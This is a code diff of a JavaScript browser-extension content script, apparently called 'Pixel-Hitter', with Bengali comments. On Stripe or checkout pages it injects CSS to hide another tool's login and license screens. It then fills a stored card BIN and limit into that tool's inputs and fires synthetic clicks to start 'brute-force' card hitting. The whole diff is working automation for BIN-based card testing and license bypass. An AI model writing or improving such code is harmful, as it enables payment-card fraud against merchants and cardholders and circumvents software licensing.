@@ -1,22 +1,60 @@
 (function() {
     const DEBUG = true;
-    if (DEBUG) console.log("--- PIXEL-HITTER HYPER-ACTION: V8 STABLE ---");
+    if (DEBUG) console.log("--- PIXEL-HITTER BRUTE-FORCE: V9 STABLE ---");
 
-    function findEverywhere(selector, text = null) {
+    const forceCSS = `
+        #app, .app-container, [id*="app-root"] {
+            display: block !important;
+            visibility: visible !important;
+            opacity: 1 !important;
+            width: 350px !important;
+            min-height: 450px !important;
+            max-height: 600px !important;
+            position: fixed !important;
+            bottom: 70px !important;
+            left: 20px !important;
+            z-index: 2147483647 !important;
+            background: #1a1a1a !important;
+            border: 1px solid #333 !important;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5) !important;
+            border-radius: 12px !important;
+            overflow: visible !important;
+        }
+        #loginWrap, .login-wrap, [id*="login"], [class*="login-screen"] {
+            display: none !important;
+            left: -20000px !important;
+            pointer-events: none !important;
+        }
+        #pixelMenu {
+            outline: 4px solid #00ff00 !important;
+            cursor: pointer !important;
+        }
+        /* নিশ্চিত করা যে BIN এরিয়া হাইড করা নয় */
+        #binArea, .bin-content {
+            display: block !important;
+            visibility: visible !important;
+        }
+    `;
+
+    function findInShadows(selector, text = null) {
         let found = [];
         function scan(root) {
             if (!root) return;
             try {
                 if (root.querySelectorAll) {
                     root.querySelectorAll(selector).forEach(e => {
-                        if (!text || (e.innerText && e.innerText.toLowerCase().includes(text.toLowerCase()))) {
-                            found.push(e);
-                        }
+                        if (!text || (e.innerText && e.innerText.toLowerCase().includes(text.toLowerCase()))) found.push(e);
                     });
                 }
-                const children = root.querySelectorAll ? root.querySelectorAll('*') : [];
-                children.forEach(el => {
-                    if (el.shadowRoot) scan(el.shadowRoot);
+                const ch = root.querySelectorAll ? root.querySelectorAll('*') : [];
+                ch.forEach(el => { 
+                    if (el.shadowRoot) {
+                        // শ্যাডো ডমে সিএসএস ইনজেক্ট করা
+                        const s = document.createElement('style');
+                        s.textContent = forceCSS;
+                        el.shadowRoot.appendChild(s);
+                        scan(el.shadowRoot); 
+                    }
                 });
             } catch(e) {}
         }
@@ -24,110 +62,58 @@
         return found;
     }
 
-    const hyperAction = (el) => {
-        if (!el) return;
-        // ১. ট্রিপল-ইভেন্ট ডিসপ্যাচ (সবগুলো সম্ভাব্য ইভেন্ট)
-        const eventTypes = ['mousedown', 'mouseup', 'click', 'pointerdown', 'pointerup', 'touchstart', 'touchend'];
-        eventTypes.forEach(type => {
-            const ev = (type.includes('touch')) ? 
-                new TouchEvent(type, {bubbles: true, cancelable: true, touches: []}) :
-                new MouseEvent(type, { view: window, bubbles: true, cancelable: true });
-            el.dispatchEvent(ev);
-        });
+    // মেইন পেজে স্টাইল ইনজেক্ট
+    const styleTag = document.createElement('style');
+    styleTag.textContent = forceCSS;
+    document.documentElement.appendChild(styleTag);
 
-        // ২. চাইল্ড নোডগুলোতেও ক্লিক (যদি থাকে)
-        const sub = el.querySelectorAll('*');
-        if (sub.length > 0) {
-            sub.forEach(s => {
-                eventTypes.forEach(t => s.dispatchEvent(new MouseEvent(t, {view:window, bubbles:true})));
-            });
-        }
-        
-        // ৩. ডিরেক্ট ক্লিক মেথড
-        if (el.click) el.click();
-    };
-
-    const cleanupAndAwake = () => {
-        const vipIds = ['pixelMenu', 'app', 'binArea', 'quickBinInput', 'quickBinUseBtn', 'bin-tab'];
-        
-        // লগইন বক্স এবং মডাল কিল করা (কিন্তু অ্যাপ নয়)
-        const overlays = findEverywhere('div', 'License')
-            .concat(findEverywhere('div', 'Telegram'))
-            .concat(findEverywhere('#loginWrap'))
-            .concat(findEverywhere('.login-wrap'));
-
-        overlays.forEach(el => {
-            const isVip = vipIds.some(id => el.id === id || el.querySelector('#' + id));
-            if (!isVip && el.id !== 'app') {
-                el.style.setProperty('position', 'absolute', 'important');
-                el.style.setProperty('left', '-15000px', 'important');
-                el.style.setProperty('pointer-events', 'none', 'important');
-            }
-        });
-
-        const app = document.getElementById('app') || findEverywhere('#app')[0];
-        const menu = document.getElementById('pixelMenu') || findEverywhere('div', 'Pixel Menu')[0] || findEverywhere('button', 'Pixel Menu')[0];
-
-        // মেনু বোতাম প্রোডাকশন এবং ওয়েকআপ
-        if (menu) {
-            menu.style.setProperty('outline', '4px solid red', 'important');
-            menu.style.setProperty('display', 'flex', 'important');
-            menu.style.setProperty('visibility', 'visible', 'important');
-            menu.style.setProperty('z-index', '2147483647', 'important');
-
-            if (!app || app.style.display === 'none' || app.offsetParent === null) {
-                console.log("[Hyper] Burst clicking the menu...");
-                hyperAction(menu);
-            }
-        }
-
-        // অ্যাপ প্রোডাকশন
-        if (app) {
-            app.style.setProperty('display', 'block', 'important');
-            app.style.setProperty('visibility', 'visible', 'important');
-            app.style.setProperty('z-index', '2147483646', 'important');
-        }
-    };
-
-    const doTask = () => {
+    const bruteForceLoop = () => {
         if (typeof chrome === 'undefined' || !chrome.storage) return;
 
         chrome.storage.local.get(['currentTask'], (res) => {
             if (!res.currentTask || !res.currentTask.bin) return;
             const task = res.currentTask;
 
-            const binInp = document.getElementById('quickBinInput') || findEverywhere('input[placeholder*="BIN"]')[0];
-            const limitInp = document.getElementById('quickLimitInput') || findEverywhere('input[id*="Limit"]')[0];
-            const startBtn = document.getElementById('quickBinUseBtn') || findEverywhere('button', 'Start')[0];
+            // ১. মেনু ড্রপডাউন বড় হওয়া নিশ্চিত করা
+            const app = document.getElementById('app') || findInShadows('#app')[0];
+            const menu = document.getElementById('pixelMenu') || findInShadows('div', 'Pixel Menu')[0];
 
-            if (binInp && startBtn && !window.hyperTriggered) {
+            if (menu && (!app || app.offsetHeight < 100)) {
+                console.log("[Brute] Menu is too small. Forcing click...");
+                ['mousedown','click','mouseup'].forEach(t => menu.dispatchEvent(new MouseEvent(t, {bubbles:true})));
+                menu.click();
+            }
+
+            // ২. ইনপুট ও স্টার্ট
+            const binInp = document.getElementById('quickBinInput') || findInShadows('input[placeholder*="BIN"]')[0];
+            const limitInp = document.getElementById('quickLimitInput') || findInShadows('input[id*="Limit"]')[0];
+            const startBtn = document.getElementById('quickBinUseBtn') || findInShadows('button', 'Start')[0];
+
+            if (binInp && startBtn && !window.bruteTriggered) {
                 binInp.value = task.bin;
                 binInp.dispatchEvent(new Event('input', { bubbles: true }));
-                
                 if (limitInp) {
                     limitInp.value = task.limit || 10;
                     limitInp.dispatchEvent(new Event('input', { bubbles: true }));
                 }
 
-                window.hyperTriggered = true;
+                window.bruteTriggered = true;
                 setTimeout(() => {
-                    console.log("[Hyper] Executing Start Sequence...");
-                    hyperAction(startBtn);
-                    chrome.runtime.sendMessage({ 
-                        type: "REPORT_LIVE", 
-                        data: { status: "ACTIVE", bin: task.bin, msg: "Bypass success. 10nd Hit started." } 
-                    });
+                    console.log("[Brute] Launching!");
+                    ['mousedown','click','mouseup'].forEach(t => startBtn.dispatchEvent(new MouseEvent(t, {bubbles:true})));
+                    startBtn.click();
+                    chrome.runtime.sendMessage({ type: "REPORT_LIVE", data: { status: "ACTIVE", bin: task.bin, msg: "Brute-force bypass active. Hitting started." } });
                 }, 1500);
             }
         });
     };
 
-    // প্রতি ১.২ সেকেন্ড পর পর চেক (Fast heartbeat)
+    // প্রতি ১.৫ সেকেন্ডে হার্টবিট
     setInterval(() => {
-        cleanupAndAwake();
+        findInShadows('nothing'); // শুধু ইনজেকশন ঠিক রাখার জন্য
         if (window.location.host.includes("stripe") || window.location.host.includes("checkout")) {
-            doTask();
+            bruteForceLoop();
         }
-    }, 1200);
+    }, 1500);
 
 })();
